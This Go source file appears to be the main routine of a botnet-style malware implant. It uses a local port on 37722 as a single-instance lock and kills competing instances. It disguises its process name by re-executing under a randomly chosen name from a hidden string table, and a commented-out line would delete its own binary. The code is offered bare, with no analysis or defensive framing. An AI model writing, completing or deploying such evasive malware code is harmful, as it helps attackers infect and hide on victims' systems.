package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"syscall"
	"time"
	//"golang.org/x/sys/unix"
)

var debug = true

func startLserver() {
	// before we start, kill the server frist
	killLS()
	l, err := net.Listen("tcp", "127.0.0.1:"+table_getID(4)) // port 37722
	if err != nil {
		if debug {
			fmt.Println("[main] Failed to start local server")
		}
		return
	}
	defer l.Close()
	if debug {
		fmt.Println("[main] Local server started")
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			if debug {
				fmt.Println("[main] Error accepting connection: " + err.Error())
			}
			continue
		}

		vt := table_getID(3)
		_, err = conn.Write([]byte(vt)) // vtubers
		if err != nil {
			if debug {
				fmt.Println("[main] Lserver | Error sending data" + err.Error())
			}

		}

		conn.Close()
	}
}

func main() {
	tableInit() // load content to memory
	if debug {
		fmt.Println("DEBUG MODE ENABLED YO")
	}
	// check if we need to kill ourselves
	conn, err := net.DialTimeout("tcp", "127.0.0.1:"+table_getID(4), 5*time.Second) // port 37722
	if err != nil {
	} else {
		defer conn.Close()

		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
		} else if n == 0 {
			if debug {
				fmt.Println("[main] No data received from local server")
			}
			killLS()
		} else {

			data := string(buf[:n])
			vt := table_getID(3) // vtubers

			if data == vt {
				if debug {
					fmt.Println("[main] Another instance is already running. Killing self")
				}
				os.Exit(1)
			} else if data != vt {
				if debug {
					fmt.Println("[main] Received unknown data from local server.")
				}
				killLS() // kill local server
			}
		}
	}
	go startLserver()

	// delete self
	//os.Remove(os.Args[1])

	fuwa := table_getID(2)
	fmt.Println(fuwa) // print success message

	// hide argv0 and process name
	//rand.Seed(time.Now().UnixNano())
	procName := table_getID(rand.Intn(6) + 5)
	syscall.Exec(os.Args[0], append([]string{procName}, os.Args[1:]...), os.Environ())
	//unix.Prctl(unix.PR_SET_NAME, []byte(procName), 0, 0, 0) // 15

	for {
		// busy loop
		time.Sleep(7 * time.Second)
	}
}
